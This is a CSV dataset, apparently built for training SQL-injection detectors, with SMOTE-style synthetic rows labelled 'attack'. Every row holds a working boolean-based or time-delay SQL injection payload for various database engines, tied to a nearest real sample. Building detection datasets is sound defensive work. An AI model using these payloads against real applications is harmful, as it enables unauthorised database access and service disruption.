id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000125,attack,boolean,-3677'   )    )    or 1939  =  4484,nearest_attack_euclidean,R000684,0.008934393382953211
SMOTE_000126,attack,boolean,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,nearest_attack_euclidean,R000069,0.8821732749876354
SMOTE_000127,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000017,0.6130374243282619
SMOTE_000128,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000015,0.029791777517174996
SMOTE_000129,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000749,0.8026752700205642
SMOTE_000130,attack,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",nearest_attack_euclidean,R000252,0.8312393817236992
SMOTE_000131,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000081,0.8151161901318085
SMOTE_000132,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000180,0.29440593725174613
SMOTE_000133,attack,boolean,"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000608,0.295545377835711
SMOTE_000134,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R000755,1.2724232070617578
SMOTE_000135,attack,boolean,"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000161,0.17301435275024868
SMOTE_000136,attack,boolean,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'eqyr' like 'eqyr",nearest_attack_euclidean,R000633,0.1136261415753853
SMOTE_000137,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000202,0.25045158806953577
SMOTE_000138,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000319,0.37422041080754154
SMOTE_000139,attack,boolean,"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000360,0.14578106266531457
SMOTE_000140,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.09680114404299328
SMOTE_000141,attack,boolean,"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",nearest_attack_euclidean,R000574,0.795566214324377
SMOTE_000142,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R000364,0.5881343478734559
SMOTE_000143,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R000126,0.4547361812157897
SMOTE_000144,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R000566,0.00033045672997983886
SMOTE_000145,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000591,0.1634496359882723
SMOTE_000146,attack,boolean,"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000737,0.23973745312723826
SMOTE_000147,attack,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,nearest_attack_euclidean,R000004,0.05226270956699896
SMOTE_000148,attack,boolean,"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",nearest_attack_euclidean,R000091,0.7023102198585093
SMOTE_000149,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000254,1.7845256025077727
SMOTE_000150,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000130,0.14745359383844658
SMOTE_000151,attack,boolean,"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",nearest_attack_euclidean,R000125,0.0604355592265214
SMOTE_000152,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000640,0.0691306908275887
SMOTE_000153,attack,boolean,-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',nearest_attack_euclidean,R000525,0.4385702763072346
SMOTE_000154,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000193,2.3057672329370718
SMOTE_000155,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd",nearest_attack_euclidean,R000642,0.7351537239310152
SMOTE_000156,attack,boolean,-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000529,0.7916054454955215
SMOTE_000157,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000267,0.8380112467896195
SMOTE_000158,attack,boolean,"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000558,0.7363252402464514
SMOTE_000159,attack,boolean,"1""   )    )    and 9198  =  9198--",nearest_attack_euclidean,R000512,0.7178745336674487
SMOTE_000160,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000443,0.002552424679108968
SMOTE_000161,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000311,0.688131632443576
SMOTE_000162,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000680,0.5324998093637819
SMOTE_000163,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.0788524052230144
SMOTE_000164,attack,boolean,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",nearest_attack_euclidean,R000113,0.20139556898037048
SMOTE_000165,attack,boolean,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000480,0.6441861109819103
SMOTE_000166,attack,boolean,1%'   )    )    and 7160  =  7249--,nearest_attack_euclidean,R000679,1.0437569943434062
SMOTE_000167,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000257,0.5680477653332616
SMOTE_000168,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R000755,0.216017000997637
SMOTE_000169,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000059,0.057138266975755414
SMOTE_000170,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000447,0.9198339549597333
SMOTE_000171,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000195,0.4317974129341564
SMOTE_000172,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000070,0.5672017258819336
SMOTE_000173,attack,boolean,"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000537,0.5832947808046749
SMOTE_000174,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000564,0.008401456971218984
SMOTE_000175,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,0.6551413518534025
SMOTE_000176,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000191,1.917229026119348
SMOTE_000177,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000401,0.1433865158428258
SMOTE_000178,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000279,0.16646038396708981
SMOTE_000179,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000599,0.7380570736208102
SMOTE_000180,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000731,0.04382189331988514
SMOTE_000181,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000313,0.03366444419478966
SMOTE_000182,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000723,0.5425739193912338
SMOTE_000183,attack,boolean,"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000314,0.014271721370806791
SMOTE_000184,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000296,0.19517852441397576
SMOTE_000185,attack,boolean,"-7843' where 5986  =  5986 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000686,0.8018980833477508
SMOTE_000186,attack,boolean,"1""  )   where 2570  =  2570 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000554,0.41265392671627404
SMOTE_000187,attack,boolean,"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000112,0.6513938300815282
SMOTE_000188,attack,boolean,"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000141,0.057300568462483575
SMOTE_000189,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R000553,0.1872932910214881
SMOTE_000190,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000322,0.20144114573112468
SMOTE_000191,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000246,0.2829491551343885
SMOTE_000192,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000079,0.008575768016440668
SMOTE_000193,attack,boolean,"1""  )   where 9962  =  9962 and 4595  =  4595#",nearest_attack_euclidean,R000696,1.4813167515011239
SMOTE_000194,attack,boolean,-7903 where 6699  =  6699 or 8571  =  8571--,nearest_attack_euclidean,R000647,1.0016083928497705
SMOTE_000195,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000610,1.1055687561337395
SMOTE_000196,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000133,0.40020641497918596
SMOTE_000197,attack,boolean,"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000532,0.10592285356518923
SMOTE_000198,attack,boolean,"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000132,0.6403937298018947
SMOTE_000199,attack,boolean,"1%'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000622,0.20799568872912455
SMOTE_000200,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000563,1.0989367094988844
SMOTE_000201,attack,boolean,"1%""   )    )    and 7358  =  6986--",nearest_attack_euclidean,R000601,0.15651572450728685
SMOTE_000202,attack,boolean,"1'+  (  select dnxi where 5850  =  5850 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000675,0.5942155890756965
SMOTE_000203,attack,boolean,"-1203""   )    )    or 8571  =  8571--",nearest_attack_euclidean,R000439,0.0713954893359692
SMOTE_000204,attack,boolean,"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000194,0.10229360373006222
SMOTE_000205,attack,boolean,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.19547568343855706
SMOTE_000206,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000484,0.34799718423893017
SMOTE_000207,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000602,0.9030977550207248
SMOTE_000208,attack,boolean,"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000631,0.3185431104511914
SMOTE_000209,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000662,1.6262270027149428
SMOTE_000210,attack,boolean,"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",nearest_attack_euclidean,R000752,1.1995885142625462
SMOTE_000211,attack,boolean,-3096' or 3821  =  5539 and 'zrth'  =  'zrth,nearest_attack_euclidean,R000098,1.6023044681151446
SMOTE_000212,attack,boolean,"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",nearest_attack_euclidean,R000702,0.7522475710748259
SMOTE_000213,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000761,1.5112169336605337
SMOTE_000214,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000473,0.18833423687135697
SMOTE_000215,attack,boolean,"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",nearest_attack_euclidean,R000405,0.7048442385308953
SMOTE_000216,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000494,0.14830552821849158
SMOTE_000217,attack,boolean,"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000384,1.0432531654819053
SMOTE_000218,attack,boolean,-9327'  )   or 3038  =  3038,nearest_attack_euclidean,R000475,0.1521882447105298
SMOTE_000219,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky",nearest_attack_euclidean,R000342,0.0702704116806604
SMOTE_000220,attack,boolean,-4351'  )   or 6525  =  9458,nearest_attack_euclidean,R000549,0.6205589539766609
SMOTE_000221,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'qgdv'  =  'qgdv",nearest_attack_euclidean,R000676,0.7904247833774843
SMOTE_000222,attack,boolean,"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000325,0.15640806464293483
SMOTE_000223,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000348,0.5899673695211212
SMOTE_000224,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000497,0.06217676180896301
SMOTE_000225,attack,boolean,"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000720,0.30925345399482873
SMOTE_000226,attack,boolean,1  )   where 5866  =  5866 and 4595  =  4595#,nearest_attack_euclidean,R000652,0.427349435620609
SMOTE_000227,attack,boolean,1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',nearest_attack_euclidean,R000543,0.5333937938935336
SMOTE_000228,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000597,0.3957218252227979
SMOTE_000229,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000582,1.3090939892384386
SMOTE_000230,attack,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'ywxc'  =  'ywxc",nearest_attack_euclidean,R000452,0.11333720705745041
SMOTE_000231,attack,boolean,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",nearest_attack_euclidean,R000645,0.20050684998968918
SMOTE_000232,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000458,0.5065690399675301
SMOTE_000233,attack,boolean,"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",nearest_attack_euclidean,R000504,0.09898943033145792
SMOTE_000234,attack,boolean,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R000382,1.0655614531173827
SMOTE_000235,attack,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'nlnk' like 'nlnk",nearest_attack_euclidean,R000779,2.310911025941899
SMOTE_000236,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000319,0.12187356456281558
SMOTE_000237,attack,boolean,1%'  )   and 2949  =  4847 and   (  '%'  =  ',nearest_attack_euclidean,R000637,0.7445942574496659
SMOTE_000238,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000143,1.0202652298860306
SMOTE_000239,attack,boolean,"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000639,0.4412253813901726
SMOTE_000240,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000296,1.800384211497856
SMOTE_000241,attack,boolean,1' where 7882  =  7882 and 6663  =  4524--,nearest_attack_euclidean,R000381,1.0052190062512407
SMOTE_000242,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000709,0.2705462362499702
SMOTE_000243,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R000644,0.045521823229381995
SMOTE_000244,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,0.0012275305162338394
SMOTE_000245,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000338,0.02128677021360283
SMOTE_000246,attack,boolean,"1""  )   where 9962  =  9962 and 4595  =  4595#",nearest_attack_euclidean,R000696,0.04635362022391946
SMOTE_000247,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000723,0.059058378350215476
SMOTE_000248,attack,boolean,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000435,0.7851975538164273
SMOTE_000249,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000412,1.9162408515485296
